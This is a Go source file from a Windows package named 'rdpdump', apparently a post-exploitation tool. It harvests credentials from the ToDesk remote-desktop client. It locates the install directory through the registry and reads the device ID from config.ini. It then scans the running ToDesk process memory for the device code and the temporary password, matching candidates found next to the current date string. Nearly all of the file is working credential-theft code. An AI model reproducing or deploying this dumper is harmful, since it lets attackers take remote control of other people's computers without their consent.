//go:build windows

package rdpdump

import (
	"bytes"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

var (
	toDeskCodeRe     = regexp.MustCompile(`^\d{6,12}$`)
	toDeskPasswordRe = regexp.MustCompile(`[A-Za-z0-9]{8}`)
	toDeskImageRe    = regexp.MustCompile(`"([^"]+)"`)
)

// ToDesk 读取 ToDesk 设备代码与临时密码
func ToDesk(hintDir string) Info {
	info := Info{}

	for _, path := range toDeskConfigPaths(hintDir) {
		values := readINI(path)
		if info.Code == "" {
			info.Code = firstNonEmpty(values["clientid"], values["client_id"])
		}
		if info.Version == "" {
			info.Version = values["version"]
		}
		if info.Code != "" {
			break
		}
	}

	if info.Code == "" || info.Password == "" {
		if pid := findProcessPID("ToDesk.exe", "ToDesk_Service.exe"); pid != 0 {
			code, password := scanToDeskMemory(pid)
			if info.Code == "" {
				info.Code = code
			}
			if info.Password == "" {
				info.Password = password
			}
		}
	}

	return info
}

// toDeskConfigPaths 返回 ToDesk 配置文件候选路径
func toDeskConfigPaths(hintDir string) []string {
	paths := make([]string, 0, 4)

	if dir := toDeskInstallDir(); dir != "" {
		paths = append(paths, filepath.Join(dir, "config.ini"))
	}
	if hintDir != "" {
		paths = append(paths, filepath.Join(hintDir, "config.ini"))
	}
	for _, dir := range programDirs() {
		paths = append(paths, filepath.Join(dir, "ToDesk", "config.ini"))
	}

	return dedupePaths(paths)
}

// toDeskInstallDir 从 ToDesk_Service 服务注册表读取安装目录
func toDeskInstallDir() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Services\ToDesk_Service`, registry.QUERY_VALUE)
	if err != nil {
		return ""
	}
	defer key.Close()

	if dir, _, errDir := key.GetStringValue("Dir"); errDir == nil && dir != "" {
		return dir
	}

	imagePath, _, errImage := key.GetStringValue("ImagePath")
	if errImage != nil || imagePath == "" {
		return ""
	}
	if match := toDeskImageRe.FindStringSubmatch(imagePath); match != nil {
		return filepath.Dir(match[1])
	}
	if fields := strings.Fields(imagePath); len(fields) > 0 {
		return filepath.Dir(fields[0])
	}

	return ""
}

// scanToDeskMemory 内存扫描设备代码与临时密码
func scanToDeskMemory(pid uint32) (string, string) {
	code := ""
	password := ""

	dateNeedle := []byte(time.Now().Format("20060102"))
	codeNeedle := []byte("clientId=")

	scanProcess(pid, func(buffer []byte) bool {
		if code == "" {
			if index := bytes.Index(buffer, codeNeedle); index >= 0 {
				segment := buffer[index+len(codeNeedle):]
				end := len(segment)
				for i, ch := range segment {
					if ch == 0 || ch == '\r' || ch == '\n' {
						end = i
						break
					}
				}
				if end > 24 {
					end = 24
				}
				if token := strings.TrimSpace(string(segment[:end])); toDeskCodeRe.MatchString(token) {
					code = token
				}
			}
		}

		if password == "" {
			if index := bytes.Index(buffer, dateNeedle); index > 1024 {
				segment := buffer[index-1024 : index]
				for _, token := range toDeskPasswordRe.FindAll(segment, -1) {
					candidate := string(token)
					if validToken(candidate) {
						password = candidate
						break
					}
				}
			}
		}

		return code != "" && password != ""
	})

	return code, password
}
